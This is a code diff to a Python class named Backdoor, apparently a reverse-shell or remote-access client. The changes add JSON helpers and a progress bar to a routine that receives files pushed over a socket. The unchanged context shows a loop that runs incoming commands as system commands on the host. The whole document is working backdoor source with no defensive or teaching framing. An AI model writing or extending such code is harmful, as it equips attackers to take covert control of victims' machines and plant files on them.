@@ -1,4 +1,4 @@
-import socket, json, sys, socket, subprocess, base64, os
+import socket, json, sys, socket, subprocess, base64, os, tqdm
 import re
 import zlib
 import linecache
@@ -18,21 +18,41 @@ class Backdoor:
 			line = linecache.getline(filename, lineno, f.f_globals)
 			return 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)
 
+
+	def json_encode(self, data):
+		json_data = json.dumps(data) #wrap data in json format
+		return json_data.encode()
+
+	def json_decode(self, json_data):
+		decoded_json = json_data.decode() #wrap data in json format
+		return json.loads(decoded_json)
+
 	def dodgy_fragmented_receive(self, filename, filesize):
 
 		base_filename = os.path.basename(filename)
+		print("Base filename: " + base_filename)
+		print("Filename: " + filename)
 		filesize = int(filesize)
 
-		with open(filename, "wb") as file:
-			while True:
+		progress_bar = tqdm.tqdm(range(filesize), "Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+
+		with open(base_filename, "wb") as file:
+			for i in progress_bar:
 				bytes_read = self.connection.recv(self._buffer_size)
-				print("reading buffer")
-				if not bytes_read:
+				#json_bytes = base64.b64decode(b64_bytes) 
+				#bytes_read = base64.b64decode(b64_bytes)
+
+				#print("reading buffer")
+				#print(str(bytes_read))
+
+				if not bytes_read or bytes_read == "" or bytes_read == None:
 					print("no bytes left to read")
-					#nothing received or upload finished
-					return "[+] Upload successful"
+					break
+					#nothing receive  d or upload finished
+					#return "[+] Upload successful"
 				# write to file
 				file.write(bytes_read)
+				progress_bar.update(len(bytes_read))
 
 
 	def reliable_send(self, data):
@@ -85,7 +105,8 @@ class Backdoor:
 				elif command[0] == "upload":
 					filename = command[1]
 					filesize = command[2]
-					command_result = self.dodgy_fragmented_receive(filename, filesize)
+					self.dodgy_fragmented_receive(filename, filesize)
+					command_result = "[+] Upload successful"
 					#command_result = self.write_file(command[1], command[2]) #name, content
 				else:
 					command_result = self.execute_system_command(command)
